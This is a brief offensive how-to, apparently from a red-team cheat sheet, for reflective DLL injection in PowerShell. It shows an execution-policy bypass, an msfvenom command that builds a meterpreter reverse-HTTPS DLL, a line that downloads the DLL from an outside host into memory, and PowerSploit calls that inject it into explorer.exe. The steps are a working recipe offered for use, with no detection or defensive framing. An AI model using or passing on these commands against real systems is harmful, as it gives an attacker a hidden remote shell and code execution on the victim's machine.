## Reflective DLL Injection in PowerShell

- https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/dll-injectors#reflective-dll-injection-rdi

- https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1


#### In order to execute the required commands, we must open a PowerShell window with “PowerShell -Exec Bypass”,

1 - msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 EXITFUNC=thread -f dll -o evil.dll

2 - 
```
$bytes = (New-Object`System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll')

$procid = (Get-Process -Name explorer).Id
```

3 - Import-Module .\Invoke-ReflectivePEInjection.ps1

4 - Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid